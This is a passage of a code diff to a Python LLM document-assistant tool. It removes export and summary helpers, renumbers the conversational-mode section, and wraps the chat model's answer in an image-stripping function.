-            f.answer,
-            " | ".join(c.label() for c in f.citations),
-            " | ".join(c.quote for c in f.citations),
-            f.note,
-        ])
-    return buf.getvalue()
-
-
-def summarise(findings: list[Finding]) -> dict[str, int]:
-    """Counts per verdict, plus the coverage score shown in the UI."""
-    counts = {COVERED: 0, PARTIAL: 0, NOT_FOUND: 0}
-    for f in findings:
-        counts[f.verdict] = counts.get(f.verdict, 0) + 1
-    counts["total"] = len(findings)
-    return counts
-
-
-# ---------------------------------------------------------------------------
-# 13. CONVERSATIONAL MODE
+# 10. CONVERSATIONAL MODE
 # ---------------------------------------------------------------------------
 
 CHAT_PROMPT = """You are a document assistant. Answer the user's question \
@@ -1088,13 +1047,13 @@ def chat_answer(
         transcript = "\n".join(f"User: {u}\nAssistant: {a}" for u, a in recent)
         history_block = f"Conversation so far:\n{transcript}\n\n"
 
-    answer = get_text(
+    answer = _strip_images(get_text(
         llm.invoke(
             CHAT_PROMPT.format(
                 history_block=history_block, context=context, question=question
             )
         )
-    ).strip()
+    )).strip()
 
     citations = [
         Citation(
